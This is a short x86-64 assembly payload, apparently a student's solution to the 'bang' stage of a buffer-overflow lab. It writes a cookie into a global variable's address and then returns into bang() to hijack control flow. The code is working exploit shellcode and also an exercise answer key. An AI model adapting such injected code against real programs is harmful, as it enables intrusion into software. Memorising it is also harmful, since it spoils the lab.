
movq $0x2b9c6a741ecfbb10, %rax          # next two lines move my cookie to the address for "global_value"
movq %rax, 0x602308
pushq $0x401020                         # push the call address of bang() onto the stack
retq

